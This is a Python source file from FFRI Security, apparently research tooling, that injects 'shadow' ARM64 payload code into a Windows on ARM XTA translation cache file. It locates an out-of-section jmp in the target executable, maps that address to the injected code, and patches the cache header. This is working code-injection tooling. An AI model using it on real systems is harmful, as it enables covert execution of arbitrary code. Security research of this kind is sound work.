# (c) FFRI Security, Inc., 2020 / Koh M. Nakagawa: FFRI Security, Inc.

import os
import sys
from typing import Generator, Optional

import lief
import r2pipe
import typer
from r2pyapi import R2Instruction, R2SearchRegion, R2Seeker, R2Surface

from xta_tools import AddressPair, XtaCache, XtaCacheManipulator

from .common import make_backup_file
from .inject_a2c import find_relocation_point, get_code_section

app = typer.Typer()


def _find_invalid_jmp_addr(
    search_results: Generator[Optional[R2Instruction], None, None],
    code_section_region: R2SearchRegion,
) -> Optional[int]:
    for search_result in search_results:
        if search_result is None:
            continue
        jmp_addr = int(search_result.code.split(" ")[-1], 16)
        if not (
            code_section_region.start_addr <= jmp_addr < code_section_region.end_addr
        ):
            return jmp_addr
    return None


@app.command()
def inject_s2c(payload_path: str, cache_dst_path: str, exe_dst_path: str) -> None:
    """
    inject "shadow" code into cache file
    """
    for path in (payload_path, cache_dst_path, exe_dst_path):
        if not os.path.exists(path):
            print(f"{path} does not exist", file=sys.stderr)
            return

    make_backup_file(cache_dst_path)

    cache_dst = XtaCache(cache_dst_path, r2_pipe_flags=["-w"])
    r2_exe_dst = r2pipe.open(exe_dst_path)
    exe_dst_surf = R2Surface(r2_exe_dst)
    if (code_section := exe_dst_surf.find_section(".text")) is None:
        print("cannot find code section (.text)", file=sys.stderr)
        return
    code_section_region = R2SearchRegion(
        code_section.vaddr, code_section.vaddr + code_section.vsize
    )

    print("Search 'invalid' jmp instruction")
    with R2Seeker(r2_exe_dst, code_section_region) as seeker:
        search_results = seeker.seek_instructions("jmp 0x")
        if (
            invalid_jmp_addr := _find_invalid_jmp_addr(
                search_results, code_section_region
            )
        ) is None:
            print("invalid jmp instruction is not found")
            return

    invalid_jmp_addr_rva_x86 = invalid_jmp_addr - exe_dst_surf.bin.baddr
    print(f"invalid jmp address rva is {hex(invalid_jmp_addr_rva_x86)}")

    # NOTE: some relocation information cannot be obtained using radare2. lief is used instead.
    payload_elf_bin = lief.ELF.parse(payload_path)
    if payload_elf_bin is None:
        print(f"{payload_path} should be ELF format")
        return

    if (reloc := find_relocation_point(payload_elf_bin, "api_call_in_cache")) is None:
        print("Cannot find relocation point. Code is injected without relocations")
        relocs = []
    else:
        relocs = [reloc]

    if (payload := get_code_section(payload_elf_bin, ".text")) is None:
        print("Cannot find code section", file=sys.stderr)
        return

    injection_point_rva_arm64 = 0x1000

    xta_manip = XtaCacheManipulator()
    xta_manip.inject_cache_code(cache_dst, payload, injection_point_rva_arm64, relocs)
    xta_manip.insert_address_pair(
        cache_dst,
        AddressPair(
            rva_x86=invalid_jmp_addr_rva_x86, rva_arm64=injection_point_rva_arm64
        ),
    )
    xta_manip.fix_xta_cache_header(
        cache_dst, "ptr_to_nt_pname", cache_dst.xta_cache_header.ptr_to_nt_pname + 8
    )
    xta_manip.fix_xta_cache_header(
        cache_dst, "num_of_addr_pairs", cache_dst.xta_cache_header.num_of_addr_pairs + 1
    )


if __name__ == "__main__":
    app()
